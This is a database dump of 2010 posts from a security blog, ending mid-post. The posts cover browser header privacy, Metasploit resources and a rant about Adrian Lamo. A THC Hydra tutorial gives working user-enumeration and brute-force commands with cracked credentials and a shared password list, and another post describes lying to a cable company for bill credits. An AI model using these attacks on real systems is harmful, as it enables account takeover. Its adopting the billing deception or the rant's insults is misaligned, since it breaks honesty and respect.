'327','1','open','http://www.attackvector.org/?p=327','0','open','','2','<center><a href=\"http://www.defcon.org\"><img src=\"http://www.defcon.org/images/defcon-18/dc-18-logo-wide.png\"></a></center>\n\nThis is just a quick post.. are any of my readers attending DefCon this year?  If so, let me know.. maybe we can hook up.\n\n','','2010-06-14 10:04:48','2010-06-14 15:04:48','','','2010-06-14 10:04:48','2010-06-14 15:04:48','defcon-18-anyone','0','','publish','DefCon 18, anyone?','post',''),(
'329','8','open','http://www.attackvector.org/?p=329','0','open','','2','In <a href=\"http://www.attackvector.org/?p=267\">this</a> post, I point out a few browser headers which leak information that can be used for malicious purposes.  I\'m going to go into a little more detail in this post and give some pointers on what you can do to protect yourself.  Sort of.\n\nFirst, lets take a look at the headers which are the most useful for an attacker.\n\nThey are:\n<!--more-->\n<blockquote>\nHTTP_USER_AGENT\nREMOTE_ADDR\nHTTP_VIA\nHTTP_X_FORWARDED_FOR\n</blockquote>\n\nHTTP_USER_AGENT - This gives information about the OS and web browser the end user is using.  This can be useful when trying to passively identify a target, as well as pin point an attack vector (browser based attack) if the browser the user is using is old/older.\n\nREMOTE_ADDR - This gives the IP address of the machine connecting to the website.  This is collected server side and the client cannot change it*\n\nHTTP_VIA - This gives up information about whether a user is behind a proxy and, if so, what proxy software and version they\'re using\n\nHTTP_X_FORWARDED_FOR - This reveals the actual IP address of the end user when they connect to your site via proxy.\n\n* The only way to modify REMOTE_ADDR would be via spoofing.  The connection would be simplex, so only commands would be transfered, the client would never receive the response.  This would be done using TCP sequence prediction which is more difficult today than it once was.  I have not seen or heard of a successful TCP seq. pred. spoofed attack in a very, very long time.\n\nSo, the only one that can\'t (easily) be changed is REMOTE_ADDR.. the rest are controlled from within the browser and/or proxy.  We\'ll start with the user agent.\n\nDepending on your web browser, there are many different ways to change the user agent.  We\'ll start with Firefox, because that\'s the easiest.\n\nIn the address bar of Firefox, type\n\n<blockquote>\nabout:config\n</blockquote>\n\nIn the \"Filter\" box, type:\n\n<blockquote>\nuseragent\n</blockquote>\n\nRather than changing the whole string at once, you have to modify each individual part of the string.  If you want to see what your current user agent header looks like, go <a href=\"http://www.attackvector.org/cgi/env.cgi\">here</a>.\n\nAlternatively, if you don\'t feel like doing it by hand and want a few more features (like, the ability to mimic a different browser entirely), Firefox has a plugin called \"User Agent Switcher\".  I haven\'t played with it, but it appears pretty straight forward and simple.\n\nNext, we\'ll change the user agent of Chrome.  (ps - if you\'re not using Chrome, you should be.. for a multitude of reasons - faster, lighter, more secure.  \'nuff said)\n\nChanging the user agent is pretty simple in Chrome.  There\'s a \"--useragent\" startup switch.  So, example:  \n<blockquote>\ngoogle-chrome --useragent=\"Chrome is the best!\"\n</blockquote>\n\nWill result in: \n\n<blockquote>\nHTTP_USER_AGENT:Chrome is the best!\n</blockquote>\n\nThere are quite a few command line switches for Chrome.. you can find some of them <a href=\"http://chromespot.com/forum/google-chrome-tips-and-tricks/697-chrome-exe-command-line-switches.html\">here</a>.  I did notice, though, that they don\'t list \"useragent\" as being a command line switch.  Not sure why.  Also, you may want to check out the \"--incognito\" switch and, if you\'re daring and prefer security over ease of use, add that as one of your default startup options.  I do.  :-)\n\nOk, on to.. ahem.. Internet Explorer.  Does anyone even really run this pile of crap anymore?  I mean, how many times will you have to rid yourself of spyware, malware, viruses, etc. before you\'ll decide that it\'s easier to run a different browser than it is to reinstall Windows every 3 days? </rant>\n\nAnyway, for those of you who, for whatever reason, still choose to run IE, here\'s how you change it\'s user agent.  Though, I\'m surprised you\'re even interested, because security OBVIOUSLY isn\'t of much concern to you.  (Sorry, I really hate Windows.. and by combining Windows & IE my hatred grows rapidly.  Get used to being flamed in my posts if you\'re running IE.. :-) go <a href=\"http://www.pctools.com/guides/registry/detail/799/\">here</a>.  He has a good write up on the topic.\n\n<b>CAVEAT</b>:  A lot of websites rely on the user agent string to format their pages correctly.  If you change your user agent string to something random (like, \"Chrome is the best!\", for example) you will break pages and some pages wont even let you visit their site.\n\nThe next two, HTTP_VIA and HTTP_X_FORWARDED_FOR will need to be changed at the proxy level, since these are headers added by a proxy.  Here\'s a good example of why you\'ll want to make sure you\'re using a proxy that doesn\'t send this information:\n\n<blockquote>\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)\n\nIP Address               : 187.60.253.30\nReverse DNS              : 187.60.253.30\nReverse DNS IP           : 187.60.253.30\nReverse DNS Authenticity : [Possibly Forged]\nProxy Info               : PROXY DETECTED\nProxy Data               : 187.60.253.30 | MASKED IP: 78.88.168.38\nProxy Status             : TRUE\nHTTP_VIA                 : 1.1 187.60.253.30 (Mikrotik HttpProxy)\nHTTP_X_FORWARDED_FOR     : 78.88.168.38\n</blockquote>\n\nThis is someone who tried to leave comment spam.  Because he\'s an idiot, he\'s using a proxy that passes on the HTTP_X_FORWARDED_FOR and the HTTP_VIA headers, giving me information about the proxy as well as revealing his real IP address.  So, he shouldn\'t even bother using a proxy if he\'s attempting to use to surf anonymously.\n\nThere are about a billion different proxy server software suites out there and each will need to be configured differently.  Here, I will focus on the only one that I use (for many reasons) and will run on both *NIX and Winblows.  Though, running a proxy server on a windows box seems... hm.  Strange?  Can\'t think of a nice way to write what it is that I\'m thinking, so we\'ll just say that it\'s not something that I would advise.  How about that for being politically correct?  ;-)\n\nAnyway, Squid has an enormous amount of configuration options.  Take a few hours and read through the squid.conf file to see what I mean.  But, for the sake of this post, we\'re really only interested in two options.\n\n<blockquote>\n#  TAG: via     on|off\n#       If set (default), Squid will include a Via header in requests and\n#       replies as required by RFC2616.\n#\nvia off\n</blockquote>\n\nYes, by setting this to \"off\" you\'re breaking RFC2616 compliance, but.. sometimes the RFC is wrong.  (I\'m starting to sound like Microsoft.....)\n\nThe other Squid option that you want to configure is:\n\n<blockquote>\n#  TAG: forwarded_for   on|off\n#       If set, Squid will include your system\'s IP address or name\n#       in the HTTP requests it forwards.  By default it looks like\n#       this:\n#\n#               X-Forwarded-For: 192.1.2.3 \n#\n#       If you disable this, it will appear as\n#\n#               X-Forwarded-For: unknown\n#\n#Default:\nforwarded_for off\n</blockquote>\n\nAgain, make sure to set it to \"off\", because the default is \"on\".\n\nA good site that I found that talks about configuring Squid\'s privacy options is <a href=\"https://calomel.org/squid.html\">https://calomel.org/squid.html</a>.\n\nAlso, if you have instructions on how to change these options in other proxies, feel free to write them up in the comments below.\n','','2010-06-15 13:01:03','2010-06-15 18:01:03','','','2010-06-15 13:01:03','2010-06-15 18:01:03','browser-headers-and-information-leaks','0','','publish','Browser headers and information leaks','post',''),(
'334','2','open','http://www.attackvector.org/?p=334','0','open','','2','I came across this at <a href=\"http://darknet-consulting.com\" rel=\"nofollow\">Darknet Consulting</a> today and decided that it was worthy of reposting here.  It\'s a pretty good introduction to Metasploit, but you probably wont learn anything new if you\'ve used Metasploit in the past.\n\nIf, however, you\'ve heard about Metasploit, don\'t know what it is, how it works, or what it does.. this video is definitely for you.  :-)\n<!--more-->\n\n<center><embed width=\"600\" height=\"500\" src=\"http://darknet-consulting.com/video/vector2/meta101.wmv\" autostart=\"true\"></center>\n\nHere are two more resources for Metasploit that are more in depth.  These would be geared more to those who have experience with Metasploit and want to delve deeper into the framework.\n\nThe first is from <a href=\"http://www.irongeek.com\" rel=\"nofollow\" target=\"_blank\">IronGeek</a>.  The video is from a 7 hour class that took place on May 8, 2010.  It\'s split up into 6 parts.  It can be found here:\n\n<a href=\"http://www.irongeek.com/i.php?page=videos/metasploit-class\" rel=\"nofollow\" target=\"_blank\">http://www.irongeek.com/i.php?page=videos/metasploit-class</a>\n\nThe second is from <a href=\"http://www.offensive-security.com\" rel=\"nofollow\" target=\"_blank\">Offensive Security</a> and probably the best documentation that you\'re going to find regarding Metasploit.  This is a *must read* for anyone who wants to really learn the ins and outs of Metasploit.\n\n<a href=\"http://www.offensive-security.com/metasploit-unleashed/\" rel=\"nofollow\" target=\"_blank\">http://www.offensive-security.com/metasploit-unleashed/</a>\n\nThanks to Sie for mentioning both of these.','','2010-06-16 10:48:59','2010-06-16 15:48:59','','','2010-06-16 10:48:59','2010-06-16 15:48:59','metasploit-101-video','0','','publish','Metasploit 101 (Video)','post',''),(
'345','0','open','http://www.attackvector.org/?p=345','0','open','','2','On May 27th, Tenable Security (the makers of Nessus) did a podcast and used one of my articles as the subject.  The topic they picked up was the \"Fun with Printers\" series and it was neat to hear their insight on the topic.\n\nHere\'s the podcast (the \"fun with printers\" topic is about 6 minutes in to the audio):\n\n<!--more-->\n\n<center><embed src=\"http://tenable.typepad.com/files/tenablepodcast-episode35.mp3\"></center>\n\nHere\'s a link to the accompanying <a href=\"http://blog.tenablesecurity.com/2010/05/tenable-network-security-podcast---episode-35.html\">blog post</a> discussing the topics of the podcast.\n\nAnd, here\'s the links to the each of the 3 parts of the \"Fun with Printers\" series:\n\n<a href=\"http://www.attackvector.org/?p=108\">Part 1</a>\n<a href=\"http://www.attackvector.org/?p=110\">Part 2</a>\n<a href=\"http://www.attackvector.org/?p=209\">Part 3</a>\n\n\n\n','','2010-06-16 12:14:39','2010-06-16 17:14:39','','','2010-06-16 12:14:39','2010-06-16 17:14:39','tenable-security-podcast','0','','publish','Tenable Security Podcast','post',''),(
'355','13','open','http://www.attackvector.org/?p=355','0','open','','2','I don\'t really want to use my blog as a pulpit to opine on pop culture, news, current events and the likes.  However, because this story has its roots in technology and hacking, I feel that it fits my genre.\n\nFirst, some background.  I\'m sure most of you know of <a href=\"http://en.wikipedia.org/wiki/Adrian_Lamo\" rel=\"nofollow\" target=\"_blank\">Adrian Lamo</a>, also known as \"The Homeless Hacker\".  I think using the term \"Hacker\" to describe Lamo is used rather loosely, but I\'m not sure what would describe him more accurately.  His entire \"hacking\" career consisted of using a web browser to dig through corporate websites in order to find information that the company may not have wanted public.  No coding, no scripting, nothing.  He just has an ability to sit in front of a computer, point and clicking his way around a website, for longer than most other people.  Does this make him a hacker?  It really comes down to definition.\n<!--more-->\nI actually knew Lamo once upon a time.  He and I spoke on multiple occasions and I found him to be scattered and, well, odd.  Recently it was discovered that he has Aspergers syndrome, which explained a lot when I found out.  All of a sudden our strange and convoluted conversations that we once had made sense.\n\nAt one point, he had a warrant out for his arrest as a result of his unauthorized access into certain parts of networks belonging to Microsoft, Yahoo, the New York Time\'s, et al.  He subsequently turned himself in and was sentenced to 6 months of house arrest at his parents home.\n\nHe was also in the recently released documentary entitled \"Hackers Wanted.\"  A more appropriate title would have been, \"A day in the life of Adrian Lamo\", but I digress.  The documentary is available via torrent if you\'re interested in seeing it.\n\nNow that you have some background information, I\'ll get to the real point of this post.\n\nAdrian Lamo has been portrayed as being like Kwai Chang Caine of the hacker community.  No possessions, no address, drifting from one location to another, not accepting money for doing work, and loads of other monk-like behavior.  However, during his journey, he realized that the media loves stories like this.  He began doing interview after interview.  He was in the spotlight and getting the attention that mommy and daddy never gave him.  He loved it.\n\nHis fame lasted for longer than it should have, honestly, but just like every other fad, Adrian went back into the hole that he crawled out of as soon as the cameras found something new to focus on that as more interesting than poor little Lamo.\n\nThat was until May of 2010 when he had his backpack stolen which held his ADD medication.  He called the police to file a report and the police thought that Adrian was so bizarre and unusual, that he might be psychotic and a threat to himself.  So, once again, Adrian gets arrested and put in to 72 hour psychiatric hold.  And, once again, he\'s back in the headlines, \"Psychotic Hacker Adrian Lamo Committed to Asylum\", or some such nonsense.  And, once again, Adrian\'s happy because the camera is focused on him.  And, once again, he\'s crawled out of his hole to bless us with his presence.\n\nThis time, however, he intends on staying in the limelight for as long as possible.  Because he possesses virtually no technical ability, the only way he can accomplish this is by throwing someone else under the bus.  Enter <a href=\"http://en.wikipedia.org/wiki/Bradley_Manning\" rel=\"nofollow\" target=\"_blank\">Bradley Manning</a>.\n\nBradley Manning worked as a US Army Intelligence Analyst and was able to access confidential documents on the Army\'s network.  He found thousands of them and submitted them to <a href=\"http://www.wikileaks.com\" rel=\"nofollow\" target=\"_blank\">Wikileaks</a>.  One of his leaks was a video of a US Blackhawk helicopter smoking two Reuters journalists.  Literally hovering over them and raining down gunfire any time they saw movement.  They then also smoked the driver and the kids inside of a van that came to try to pick up the survivors and find them medical aid.  Obviously, the government would have preferred that this stay underwraps, but Bradley Manning released it and broke a huge story.  Who knows what else was contained in the thousands of other documents and videos that he submitted.  Wikileaks has not released them yet and, as of the last report that I saw, they\'re still working on decrypting the videos and verifying the data.\n\n<center><embed src=\"http://i.cdn.turner.com/cnn/.element/apps/cvp/3.0/swf/cnn_416x234_embed.swf?context=embed&videoId=world/2010/04/06/vo.apache.reuters.journalists.cnn\" type=\"application/x-shockwave-flash\" bgcolor=\"#000000\" allowfullscreen=\"true\" allowscriptaccess=\"always\" width=\"416\" wmode=\"transparent\" height=\"374\"></embed></center>\n\nBut, how do we know that it was Bradley Manning that released all of this?  I mean, obviously anyone stealing information surrounding government cover ups and corruption would not want to be revealed, right?  Well, Adrian Lamo viewed this as the perfect opportunity to get back in front of the camera and suck up all the attention that he could get.  How did do this?  Bradley Manning made a huge mistake.  He trusted Lamo and kind of spilled his guts about what he had done.  Lamo merely sat there, listening and logging, trying to pry more information out of Manning.\n\nOnce he had as much information as he thought he would need, he went to the FBI and handed it over.  I would imagine the exchange went down something like this:\n\n<blockquote>\n<Adrian>  Hi FBI guys, I have information that you might be interested in regarding confidential and top secret military information\n<FBI> Why, yes, that is something we\'d be interested in.. how would you like to be compensated for this information?\n<Adrian> Well, because money goes against my monk-like lifestyle and Jesus, I don\'t want money... but if you can make sure that Wired, Slashdot, NBC, CBS, the New York Times, Life, Time, National Geographic, Playboy, Penthouse, Hustler, and the Gideons all show up with cameras and reporters when I turn this over, I can have it to you by tomorrow.\n<FBI> ....\n</blockquote>\n\nYes, Manning made a mistake to trust anyone.  That\'s pretty much rule #1 of this game.  Trust no one.  So, did he get what he deserved for breaking that cardinal rule?  I guess.  Let it be a lesson to everyone else; Seriously, don\'t trust anyone.  Assume that everyone is out to get you or will, at least, throw you under the bus if it comes down to it.\n\nHowever, given Lamo\'s background, his \"status\", etc.  I\'m sure Manning figured that he was safe talking to him.  I mean, Lamo was also a submitter to Wikileaks, plus he was a former \"hacker\" (read: internet explorer master), so why not?\n\nSo, Adrian, prior to this episode, I figured you were just another talentless script kiddy media whore.. come to find out, however, that you don\'t even live up to that title.  Somehow you have found a level 10 or 12 notches down from that one, which is quite a feat, considering I figured \"talentless script kiddy media whore\" was at the bottom of the food chain.  How about, \"the feces of the talentless script kiddy media whores\"?\n\nThe reason why this upsets me so much is due to the fact that Wikileaks is providing a service that allows us to get our hands on information that the governments of this world would never allow us to have.  They prefer to keep us blind, deaf, and dumb, and Wikileaks is combating that.  By Lamo outing one of its submitters, people are going to begin to think twice about submitting information that could ultimately wind them up in prison, or lynched.\n\nHonestly, the end goal for most hackers is obtaining information because we believe that information should be free (sorry, I realize that\'s a huge cliche, but....).  The last thing I would have expected from a member of this community is turning on someone who\'s releasing information.  I guess I shouldn\'t say \"last thing\", because I\'ve seen it happen before amongst this culture, but it was generally due to someone getting heat from the feds and narcing on someone else to protect their own necks.  But never have I seen someone out someone else, simply to get in front of the camera for an additional 15 minutes of fame.\n\nAdrian, you are a sad, pathetic little individual.  You can blame it on your medications, or aspergers, or anything else you want, but in the end.. what you did was wrong, and you did it for the wrong reasons.  Enjoy your time in front of the camera, but you had better walk a pretty straight and narrow line from this point on, because one slip and someone is going to narc on you like you\'ve never been narc\'d on before and I will definitely be republishing that story here. ','','2010-06-17 10:54:59','2010-06-17 15:54:59','','','2010-06-17 10:54:59','2010-06-17 15:54:59','my-02-on-lamo-the-media-whore','0','','publish','My .02 on Lamo - The Media Whore.','post','');
INSERT INTO `ghav_posts` (`ID`,`comment_count`,`comment_status`,`guid`,`menu_order`,`ping_status`,`pinged`,`post_author`,`post_content`,`post_content_filtered`,`post_date`,`post_date_gmt`,`post_excerpt`,`post_mime_type`,`post_modified`,`post_modified_gmt`,`post_name`,`post_parent`,`post_password`,`post_status`,`post_title`,`post_type`,`to_ping`) VALUES (
'359','28','open','http://www.attackvector.org/?p=359','0','open','','2','Sometimes the only way in is to resort to password cracking (or, \"brute forcing\").  I would consider this to be another one of those last resort methods that I use when all else has failed.\n\nI don\'t like to use brute force methods because they\'re noisy and can break stuff.  There\'s actually a fine line between a brute force and a denial of service attack, so be careful whenever using this method.\n\nAnyway, there are 3 programs that I use when it comes to brute forcing passwords.  There\'s something I wrote (which is not public, so I wont be releasing it.. sorry. :) ), there\'s ncrack, which is relatively new and still under development, and then there\'s THC Hydra.\n\nI think ncrack will be a solid contender in this arena after it\'s be fine tuned, but as of this point, Hydra is still the leader, so that\'s what I\'m going to focus on in this post.\n<!--more-->\nHydra has the ability to brute force passwords over a multitude of services:\n\n<blockquote>\nSupported protocols: telnet ftp pop3[-ntlm]   imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco  cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5   rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere  teamspeak sip vmauthd\n</blockquote>\n\nA couple examples...\n\nFirst, grab the userlist from the PDC...\n<pre lang=\"bash\">\n\nnmap --script=smb-enum-users 192.168.0.3 -p 445|perl -le \'while(<STDIN>){if(/^.*?\\(w+)s+.*/) { print \"$1\"; }}\' >> userlist\n\n</pre>\n\nThen run the userlist through Hydra..\n\n<blockquote>\n# hydra -L userlist -P password 192.168.0.3 smb\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:08:24\n[DATA] 1 tasks, 1 servers, 180 login tries (l:30/p:6), ~180 tries per task\n[DATA] attacking service smb on port 139\n[139][smb] host: 192.168.0.3   login: Administrator   password: zygote\n[139][smb] host: 192.168.0.3   login: audit   password: qwerty\n[139][smb] host: 192.168.0.3   login: bdouglas   password: javajoe\n[139][smb] host: 192.168.0.3   login: security   password: qwerty\n[139][smb] host: 192.168.0.3   login: testuser   password: qwerty\n[STATUS] attack finished for 192.168.0.3 (waiting for childs to finish)\nHydra (http://www.thc.org) finished at 2010-06-17 12:08:24\n</blockquote>\n\nYou\'ll notice that I started the attack at 12:08:24 and it finished at 12:08:24, to give you an idea of the speed.\n\nThe next example will be attacking their website.  Their website uses .htaccess to protect certain areas.  We\'ll use the same userlist that we stole from the PDC and hope that one of them is listed in the .htpasswd file.\n\n<blockquote>\n# hydra -L userlist -P password www.companysite.com https-head /financials/\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:15:15\n[DATA] 16 tasks, 1 servers, 217 login tries (l:31/p:7), ~13 tries per task\n[DATA] attacking service http-head on port 443\n[443][www] host: 11.22.33.44   login: bdouglas   password: javajoe\n[STATUS] attack finished for www.companysite.com (waiting for childs to finish)\nHydra (http://www.thc.org) finished at 2010-06-17 12:15:22\n</blockquote>\n\nGreat, found one.  Now it would be really handy to have access to the FTP site for their website...\n\n<blockquote>\n# hydra -L userlist -P password ftp.companysite.com ftp -f\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:24:14\n[DATA] 16 tasks, 1 servers, 224 login tries (l:32/p:7), ~14 tries per task\n[DATA] attacking service ftp on port 21\n[21][ftp] host: ftp.companysite.com   login: bdouglas   password: javajoe\nHydra (http://www.thc.org) finished at 2010-06-17 12:24:17\n</blockquote>\n\nThis bdouglas guy has access everywhere.. and he\'s super original with his passwords, too.\n\nAs you can see, hydra is pretty effective when it comes to brute forcing various services.  The most important part is to have an effective password list.  \n\nBecause humans are, well, human, they tend to think alike.  That\'s why passwords like, \"love\" and \"sex\" and \"password\" are always amongst the top of the \"Most Frequently Used Passwords\" list.  So, what I\'ve done is collected password lists from various network compromises where a password list was made public and combined them all into one gigantic list of 17,965,793 passwords and wrote a little script to make sure there are no duplicates.  :-)\n\nThe sources used to create this list are:\n\n<li>The 500 worst passwords list</li>\n<li>Alyssa banned passwords list</li>\n<li>Cain\'s list of passwords</li>\n<li>Conficker\'s list</li>\n<li>The English dictionary</li>\n<li>Faithwriters banned passwords list</li>\n<li>Hak5\'s list</li>\n<li>Hotmail\'s banned passwords list</li>\n<li>Myspace\'s banned passwords list</li>\n<li>PHPbb\'s compromised list</li>\n<li>RockYou\'s compromised list</li>\n<li>Twitter\'s banned passwords list</li>\n<li>The names of all US cities</li>\n<li>And various other ones that aren\'t worth mentioning... </li>\n\nWhat we wind up with, is an enormous list of the most popular passwords, which is incredibly effective.\n\nAnd, because I\'m such a nice and wonderful guy, I\'ve decided to share it with my readers.  You can find it <a href=\"http://www.attackvector.org/files/thelist.txt.bz2\">here</a>.  It\'s bzipped and still about 95 megs.\n\nYou can find THC at <a href=\"http://freeworld.thc.org/\" rel=\"nofollow\" target=\"_blank\">www.thc.org</a> and you can find THC Hydra at <a href=\"http://freeworld.thc.org/thc-hydra/\" rel=\"nofollow\" target=\"_blank\">http://freeworld.thc.org/thc-hydra/</a>\n\nIt\'s also worth mentioning, though, that Hydra seems to fall short when it comes to web forms.  Theoretically, it\'s capable of handling a web form, but I\'ve yet to be able to make it work.  For that, I use other utilities.. which I\'ll blog about here at some point.\n\nHowever, according to the Hydra documentation, this is how it\'s supposed to work against a web form:\n\n<blockquote>\n# hydra -l admin -P passwod www.wordpressblogsite.org http-post-form \"/wordpress/wp-login.php:user_login=^USER^&user_pass=^PASS^:Incorrect\" -t 4\n</blockquote>\n\nWhat this is telling Hydra is that in the form, the two input boxes are named \"user_login\" and \"user_pass\", respectively, and that Hydra should fill in those blanks with the various username and password combinations specified via the command line.\n\nHow you figure out what the form input boxes are named.. simply go to the website, view the source of the page, and look for:\n\n<blockquote>\n...snip...\ninput type=\"text\" name=\"log\" id=\"user_login\" class=\"input\"\n..snip...\ninput type=\"password\" name=\"pwd\" id=\"user_pass\" class=\"input\"\n</blockquote>\n\nPretty simple.. but, again, Hydra doesn\'t seem to like it.  If you\'ve gotten this to work yourself, please let me know.  I\'d be interested in seeing what I\'m doing wrong.  :-)\n\n','','2010-06-17 12:53:02','2010-06-17 17:53:02','','','2010-06-17 12:53:02','2010-06-17 17:53:02','brute-force-with-thc-hydra','0','','publish','Brute Force with THC Hydra','post',''),(
'366','5','open','http://www.attackvector.org/?p=366','0','open','','2','Notice that I didn\'t say \"free\" in the title.  Very rarely can you get free services from, say, your cable provider, your internet provider, etc.  But, you can get them greatly reduced using some really simple techniques that I will talk about here.\n\nAlso, I would love to hear from you on some techniques, tricks, ideas, whatever, that you use to obtain free/reduced price services and products.\n\nI\'m actually going to use an example that I just went through today that got one of my bills reduced by half (actually, more than half) and was applied to the previous two bills as well.\n<!--more-->\nSo, I\'m really tired of being nickled and dimed by internet/television service providers.  Yes, I realize that they need to make money and that they spend a lot of money on infrastructure and employees, etc.  But, they kind of have a monopoly in my area, which allows them to charge just about whatever they want without much (any?) competition.\n\nWe\'re going to call this company... Comcrap.\n\nMy service is pretty simple.  \n\n<center>\n<li>16mb internet - $52</li>\n<li>HD DVR - $15</li>\n<li>Digital cable - $79</li>\n<li>Rental modem - $5</li>\n<li>Taxes - Ridiculous</li>\n<li>Total: About $165 on average</li>\n</center>\nThat, to me, is a hideous amount to pay for what I get.  Half the channels I don\'t even use and I don\'t have any premium channels (HBO, Showtime, etc.)  Something must be done about this.\n\nFirst, about a month ago I went to Comcrap\'s website and began researching their television plans.  I went through each one of them, channel by channel to see which plan had all the channels that I use (Food network, Discovery, NatGeo, A&E..)  I find this virtually unadvertised plan called \"Digital Economy\".  Low and behold, it has all of the channels I watch, plus a lot of others that I don\'t.  Price? $29.95.  Immediately saving $50 a month just on the television portion.  Nice.\n\nSo, I call Comcrap and start talking to them about cable services.  They list off 3 plans, never mentioning the \"Digital Economy\" plan.  I ask the lady on the phone, \"What about the Digital Economy plan?\"  ...pause... \"I\'ve never heard of that plan...\"  Interesting, so this plan is apparently not part of their script, or regular list that they use when customers call in about plan options, even though it has virtually every channel people want.\n\nShe looks it up and goes, \"Wow.. I didn\'t even know we had this plan.\"  I respond with, \"It seems that it has most of the channels that I\'m looking for, too\"  She says, \"Yeah, me too!\" with a certain amount of excitement in her voice.  Maybe she just found her new plan as well.\n\nShe does indicate, however, that apparently the DVR will no longer work and that I\'ll have to return it.  Bummer.. big.. big bummer.\n\nBut, I schedule some tech to come out on the 12th and put a filter on my line so that I can be downgraded.  I cancel the first appointment and they have to reschedule it for a week and a half later - the 26th (important).\n\nI wait the additional week and a half and the tech gets to my house and I explain what I\'m doing and he informs me that, officially, Comcrap doesn\'t support the DVR on the Digital Economy plan.. however.. it works just fine.\n\nSo, they lie to you in order to get you to bump up to their next package, because, really, whats the point of having TV without a DVR these days?  15 minutes of show, 45 minutes of commercials.  So, most people opt to spend the additional $20 to go with the next tier of service that DOES support a DVR.  Well, game on, bitches.  If you\'re going to try to scam and lie to me in order to suck more money out of me, I\'ll do it right back and I guarantee I\'ll be the victor.\n\nI wait until I get my first bill, which is actually $187 and I call Comcrap and get to the infamous \"Customer Retention Department\".  You might as well ignore everyone else until you get to this department.  The key words to get to this mystical land are:  \"I think I\'d like to cancel my account..\"  Or, you can simply ask \"Do you have a customer retention department?\"\n\nThe latter is a bit more bold, indicating that you\'ve been through this process before and know the ropes, which may make it more difficult to actually be forwarded to the department.  Also, if you make it unpleasant for the current person that you\'re working with, they\'ll be more than happy to forward you wherever you want to go, so long as it doesn\'t involve them continuing to have to deal with you.\n\nSo, I usually come across as very upset for some reason (in this case, my $187 bill, even though I downgraded my service and it should have been prorated).  I\'m straight to the point, and I\'m pissed.  I vent for a bit and then end with, \"You know what.. why don\'t I just cancel my service.. this is ridiculous\"  Response - \"One moment please, I\'ll forward you to our cancellation department\"  Also known as.... Customer Retention!  :-)\n\nNow, this is where you summon one of your more pleasant personalities.  Bitching at the people in customer retention will not work, so don\'t.  You need for them to feel as if they can help you.  Their job at the company is to *retain customers*.  Your job is to lead them to water.  In order for this to work, you have to give them a way to wind up being the winner;  Retain you.  Think about it this way.. if you sat in a call center and someone called you up and started bitching and yelling at you, would you want to give them a way to save money?  No, probably not.\n\nI start the conversation by discussing the obviously incorrect $187 bill (was it incorrect?  no, not really..)  She begins to explain that the tech came out on the 26th, which was <i>after</i> my billing cycle ended.  I say, \"the 26th?  no.. it couldn\'t have been the 26th.. I was out of town on the 26th.  Let me look at my calendar\" *clickity clickity click\"  \"My calendar says that it was scheduled for the 12th.. and I know that it was a Wednesday because he made me late for my bowling league\"  (No, I don\'t bowl.. but, she doesn\'t know that and I needed something to reference to make her believe that I knew what the date really was).\n\nShe responds with, \"That\'s odd.. didn\'t you cancel the one on the 12th?\"  \"Ohhh!  I remember now.. I called in to cancel that appointment but it was too late in the afternoon and he showed up before he got the message that it was canceled\"  \"Oh.. that makes sense then.. it\'s just coming up in the computer as being canceled.. I can fix that.. hold on\"\n\nPerfect.  ;-)\n\nShe comes back with, \"OK, so I adjusted your account.. it looks like the credit will be $24.98.. but I also found a reversed credit on your account for $21.82 that I reapplied\"  Sweet, just saved $50.\n\nI begin talking to her about my what my bills will begin to look like going forward, now that I\'m on the digital economy plan.  She lists off my services and gets to the DVR being $15.95\n\nWait a second...... \"The DVR?  I didn\'t think the DVR worked on the digital economy plan.. the tech took it when he came out to put on the filter.\"  ...long pause... \"Oh, you\'re right.. hold on\".  She must have looked up the plan and saw where it says that the DVR isn\'t supported.  Just saved another $15.95.  I don\'t want to consider this to be a lie, really.  Lets consider it, a \"Reverse engineering of a lie\", because honestly, I just used the lie that they told me back against them.  If it wasn\'t in their documentation to tell customers that the DVR doesn\'t work on the economy plan, I wouldn\'t have been able to reference it, right?  :-)\n\n\"Ok, with the DVR taken off, your total monthly bill will be about $116, with tax\"  Still not good enough.  I\'m looking for sub $100.  My response: \"Hrm.. that\'s still more than I want to pay.. I\'m taking the family on vacation at the end of July and we don\'t really use the internet and TV that much during the summer.. maybe I should just cancel it\"\n\nNote:  Family vacations = $$$$.. everyone knows that.  She can probably identify with the not watching tv much during the summer, because with most families having sports, vacations, bbq\'s, etc etc etc.. it\'s a lot different than during the winter when you\'re trapped inside because it\'s -92F.  Now she can identify with my position and sympathize with it.  This also leads her to believe that even though I don\'t WANT to cancel, I\'m willing to because vacation > cable every day of the week.\n\nI ask, \"Are there any promotions available right now?\"  Something to note, there are ALWAYS promotions available.  And, in the customer retention department, they apparently have the ability to put you on a promotion that is available only to \"new customers\".  ;-)\n\n..pause..clickityclick.. \"Actually, there are a few promotions that I could set you up with right now.. and it looks like I can apply them to your previous bill as well..\"\n\nScore!... \"oh?\"\n\n\"There\'s a promotion for 50% off of your internet for 6 months.. and another for 50% off of your television service for 6 months..\"\n\nScore x2!... \"Awesome!  That sounds great!  So, how much would my bill be every month??\"\n\n..clickityclickclick..\n\n\"It looks like it will be around $51 after tax..\"\n\nScore x3!  So, lets get this straight.  I have virtually the same service as I had prior to \"downgrading\", for $136 less every month?\n\n\"Wow!!  Thank you so much!  That\'s perfect!\"\n\nShe felt like she did a good job (which she did) and retained me as a customer and made me very happy.. and I\'m saving about $140 a month.  Everyone\'s a winner.. ;-)\n\nHonestly, though, I hate lying.  But if a company is going to lie to me, or at least try to hide the truth in order to get me to pay more, I\'ll take off the gloves and get over my moral convictions and fight on the same level.\n\nA couple things to keep in mind when doing something like this.\n\n1) If you\'re not good at bluffing or get uncomfortable or nervous when trying to, this is not for you.  This involves a lot of bluffing and they need to believe that you\'re willing to cancel your service during this call.\n\n2) If you\'re really not willing to cancel service, but you hit 